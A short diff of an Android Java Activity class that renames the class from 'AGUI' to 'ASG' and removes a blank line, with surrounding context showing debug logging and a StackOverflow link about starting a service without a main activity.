@@ -36,7 +36,7 @@ import com.android.mm.M;
  * http://stackoverflow.com/questions/10909683/launch
  * -android-application-without-main-activity-and-start-service-on-launching
  */
-public class AGUI extends Activity {
+public class ASG extends Activity {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
 	private static final int REQUEST_ENABLE = 0;
 	public Handler handler;
@@ -65,7 +65,6 @@ public class AGUI extends Activity {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onResume) ");
 		}
-
 	}
 
 	private void actualCreate(final Bundle savedInstanceState) {
